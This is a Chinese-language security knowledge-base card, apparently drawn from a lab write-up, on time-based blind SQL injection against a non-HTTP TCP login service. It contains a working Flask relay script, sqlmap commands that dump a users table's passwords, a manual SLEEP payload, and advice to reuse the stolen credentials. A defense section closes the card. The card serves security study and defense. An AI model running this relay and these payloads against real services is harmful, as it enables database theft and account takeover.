---
id: web-generic-sqli-raw-tcp-login-relay-proxy
title: 非 HTTP 原始 TCP 登录服务的 SQL 时间盲注：TCP→HTTP 中转代理让 sqlmap 可用
type: scenario
domain: web
path: web/generic/sqli
technique: raw-tcp-sqli-relay-proxy
tags:
- sql-injection
- time-blind
- tcp
- relay
- sqlmap
- flask
- mysql
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V83
  verified_at: '2026-11-05T17:50:15+08:00'
  notes: 已对照原文与图05核对：nc 单引号异常、Flask TCP→HTTP 中转、sqlmap time-based blind 与 bin_auth.users dump（matsi 口令）一致。原文 sqlmap 命令写 127.0.0.1:8080 而中转监听 8888，属原文笔误，卡内统一为 8888 且提示 --forms 可能不适用，处理合理；PoC 未复跑；无组件版本。
url: /docs/web/generic/sqli/web-generic-sqli-raw-tcp-login-relay-proxy/
draft: false
kb_aliases:
- TCP 服务 SQL 注入
- 裸协议 SQLi
- sqlmap 中转代理
- 非 HTTP 服务注入
---

## 一句话结论

当自研 TCP 登录服务把用户名/口令直接拼进 SQL 时，注入并不受 HTTP 限制；用一个小型 TCP→HTTP 中转把两行交互协议映射成带 `user`/`pass` 参数的 HTTP 接口，即可让 sqlmap 的时间盲注引擎完成注入与拖库。

## 原理

- SQL 注入的根因是“字符串拼接构造 SQL 语句”，与承载协议无关。自定义服务即使不是 HTTP，只要把 socket 读到的用户名、口令直接拼进 `SELECT ... WHERE username='...' AND password='...'`，单引号就会改变 SQL 语法。
- 判断依据是行为差异：正常错误口令返回 `User or Password incorrect`；用户名带单引号时，查询因语法错误进入异常分支，服务端未把异常转成同样的提示，而是直接关闭连接或静默，说明输入被当作 SQL 语法解析。
- sqlmap 的扫描引擎绑定 HTTP 请求/响应模型，无法直接对裸 TCP 服务发包。中转代理的作用是把 HTTP 请求参数（`user`、`pass`）按目标协议逐行写入 socket，再把目标最后一段响应作为 HTTP 响应体返回。这样 sqlmap 的 `SLEEP()` 时间盲注仍成立：延迟发生在服务端执行 SQL 时，代理只是在 socket 上等待，响应时间差会原样传给 sqlmap。
- 中转不需要理解协议语义，只需知道“读欢迎提示→发用户名→读口令提示→发口令→读最终响应”的固定顺序；因此同一模式可复用于任意行式登录服务。

## 触发条件

- 目标服务接受行式用户名/口令输入，且服务端用字符串拼接构造 SQL（或存在其他可观察的注入行为）。
- 单引号等元字符能改变服务端行为（报错被吞、连接关闭、提示不同、响应时间变化）。
- 攻击者能从自己的位置访问目标端口，并能在本地运行中转服务。
- 数据库支持可观测的延时函数（如 MySQL `SLEEP()`）或布尔差异；账号有权限读取目标库表。
- 服务端未对登录失败做严格限速，否则时间盲注会被限速打断。

## 利用步骤

1. 手工探测：`nc target 6969`，先用正常口令观察提示，再用 `admin'` 观察响应差异，确认输入进入 SQL 语法。
2. 在攻击机写 TCP→HTTP 中转：HTTP 侧接收 `user`、`pass` 参数，TCP 侧按提示顺序发送两行，返回最终响应文本。
3. 启动中转后，用 sqlmap 指向本地 HTTP 端点，指定注入参数与 DBMS：
   `sqlmap -u "http://127.0.0.1:8888/?user=admin&pass=admin" --batch -p user --dbms=mysql`
4. 确认 time-based blind 后枚举数据库：`--dbs`；选择业务库（如 `bin_auth`）。
5. 列表与拖库：`-D bin_auth -T users -C username,password --dump`，用得到的凭据继续登录其他服务。
6. 若 sqlmap 的 `--forms` 无法识别裸协议页面，直接构造带参数的 `-u` 或 `--data`，并加 `--technique=T` 限定时间盲注。

## PoC

最小中转代理（Flask，监听本地 8888）：

```python
import socket
from flask import Flask, request

app = Flask(__name__)
TARGET_HOST, TARGET_PORT = "10.0.0.10", 6969

def relay(user, password):
    s = socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=8)
    s.recv(1024)                       # "User: "
    s.sendall((user + "\n").encode())
    s.recv(1024)                       # "Password: "
    s.sendall((password + "\n").encode())
    data = s.recv(4096)
    s.close()
    return data.decode(errors="ignore")

@app.route("/", methods=["GET", "POST"])
def index():
    return relay(request.values.get("user", "admin"),
                 request.values.get("pass", "admin"))

app.run(host="127.0.0.1", port=8888)
```

```bash
sqlmap -u "http://127.0.0.1:8888/?user=admin&pass=admin" \
  --batch -p user --dbms=mysql --technique=T
sqlmap -u "http://127.0.0.1:8888/?user=admin&pass=admin" \
  --batch -p user -D bin_auth -T users -C username,password --dump
```

手工时间盲注核心载荷（MySQL，逐字符判断）：

```text
admin' and if(substr((select group_concat(schema_name) from information_schema.schemata),1,1)='b',sleep(1),0)#
```

## 变体与关联

- 变体：没有欢迎提示的协议可改为“直接发送一行 `user\npass\n`”；协议带长度前缀或二进制字段时，中转需按格式编码。
- 变体：响应不回显但连接保持时，用时间盲注；若能区分成功/失败页面，可退化为布尔盲注。
- 变体：把中转换成通用 TCP 转发 + HTTP 适配层，可用于 SMTP、Redis 认证口、自研管理端等任意行式服务。
- 关联：[[web-generic-sqli-sourcecodester-stock-login-time-blind]]（Web 登录口时间盲注的同类判读）、[[web-generic-sqli-blind-filter-bypass-functions]]（延时函数被过滤时的替代原语）。
- 边界：若服务端对错误输入直接断开且不执行剩余 SQL，或对延时函数做了禁用，时间盲注不成立；中转本身会引入固定网络延迟，需用基线响应时间校准阈值。

## 检测与防御

- 检测：审计所有数据库访问层的字符串拼接，尤其是非 Web 服务与自研 socket 服务；监控登录接口出现 SQL 关键字、引号、`SLEEP`/`BENCHMARK` 样式的输入；对登录失败的响应时间分布做异常检测。
- 修复：统一使用参数化查询/预编译语句，禁止把用户名、口令拼进 SQL；登录失败统一返回同一提示，不暴露数据库异常分支。
- 加固：数据库账号最小权限，禁止 `information_schema` 之外的跨库读取；登录限速与失败锁定；服务端对输入长度、字符集做白名单校验。
